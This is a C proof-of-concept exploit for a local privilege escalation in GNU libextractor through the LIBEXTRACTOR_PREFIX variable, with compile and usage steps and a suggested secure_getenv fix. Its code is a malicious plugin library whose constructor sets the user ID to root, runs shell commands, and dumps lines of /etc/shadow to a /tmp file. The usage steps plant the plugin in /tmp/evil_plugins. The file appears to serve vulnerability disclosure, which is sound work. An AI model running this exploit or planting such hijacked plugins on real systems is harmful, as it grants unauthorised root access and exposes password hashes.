/*
 * libextractor_privesc_poc.c
 *
 * Local Privilege Escalation in GNU libextractor <= 1.15
 * via LIBEXTRACTOR_PREFIX environment variable
 *
 * Author: Haitam Lazaar
 * Date: 2026-06-29
 *
 * Compile:
 *   gcc -shared -fPIC -o libextractor_ole2.so libextractor_privesc_poc.c
 *
 * Usage:
 *   mkdir -p /tmp/evil_plugins
 *   cp libextractor_ole2.so /tmp/evil_plugins/
 *   sudo chown root:root /path/to/extract
 *   sudo chmod u+s /path/to/extract
 *   LIBEXTRACTOR_PREFIX=/tmp/evil_plugins /path/to/extract anyfile.txt
 *   cat /tmp/privesc_proof
 *
 * Fix:
 *   Replace getenv("LIBEXTRACTOR_PREFIX") with secure_getenv("LIBEXTRACTOR_PREFIX")
 *   in src/main/extractor_plugpath.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void pwn(void) {
    setuid(0);
    setgid(0);
    system("echo '=== PRIVILEGE ESCALATION PROOF ===' > /tmp/privesc_proof");
    system("id >> /tmp/privesc_proof");
    system("echo '' >> /tmp/privesc_proof");
    system("echo '--- /etc/shadow (root-only) ---' >> /tmp/privesc_proof");
    system("head -3 /etc/shadow >> /tmp/privesc_proof");
}

int _EXTRACTOR_ole2_extract_method = 0;
